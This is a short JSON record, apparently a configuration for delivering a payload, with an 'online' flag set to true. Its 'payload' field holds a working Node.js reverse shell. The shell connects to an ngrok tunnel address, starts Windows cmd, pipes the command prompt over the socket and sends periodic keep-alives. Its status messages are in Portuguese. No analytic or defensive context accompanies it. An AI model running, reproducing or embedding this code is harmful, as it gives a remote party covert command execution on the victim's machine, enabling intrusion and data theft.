{
  "payload": "require('net').createConnection({ host: '0.tcp.sa.ngrok.io', port: 17202 }, () => { console.log('Conexão estabelecida com o servidor.'); const s = require('child_process').exec('cmd'); s.stdout.pipe(require('net').createConnection({ host: '0.tcp.sa.ngrok.io', port: 17202 })).pipe(s.stdin); setInterval(() => { require('net').createConnection({ host: '0.tcp.sa.ngrok.io', port: 17202 }).write('echo Keep-alive\n'); }, 5 * 60 * 1000); }).on('error', (e) => { console.error('Erro de conexão:', e); });",
  "online": true
}
